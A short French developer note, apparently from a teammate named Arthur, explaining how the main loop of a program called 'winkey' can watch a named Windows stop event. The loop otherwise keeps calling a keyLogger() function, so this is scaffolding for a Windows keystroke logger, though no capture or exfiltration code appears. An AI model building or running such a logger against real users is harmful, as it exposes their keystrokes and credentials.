Arthur: pour winkey, dans ton programme, la condition qui te permettras de sortir correctement 
		de ton while (true) c'est la fonction 'WaitForSingleObject(eventHandler, 1000);' tu recuperes
		le 'eventHandler' via 'OpenEventA(SYNCHRONIZE, FALSE, WINKEY_STOP);'.
		
		Ex:
		#define WINKEY_STOP "Global\\stop_winkey_process"

		main_loop () {
			HANDLE eventHandler = OpenEventA(SYNCHRONIZE, FALSE, WINKEY_STOP);
			if (!eventHandler)
				return (failedToOpenStopEvent());

			while (true) {
				if (!WaitForSingleObject(eventHandler, 1000)) {
					// signal d'arret de winkey recu
					freeAndCloseAll();
					return ;
				} else {
					// Tes fonctions qui continuent a log
					keyLogger();
				}
			}
		}

		Les HANDLE peuvent leak, y'a des fonctions pour les fermer, celle que je connais:
		'CloseHandle(handler);'
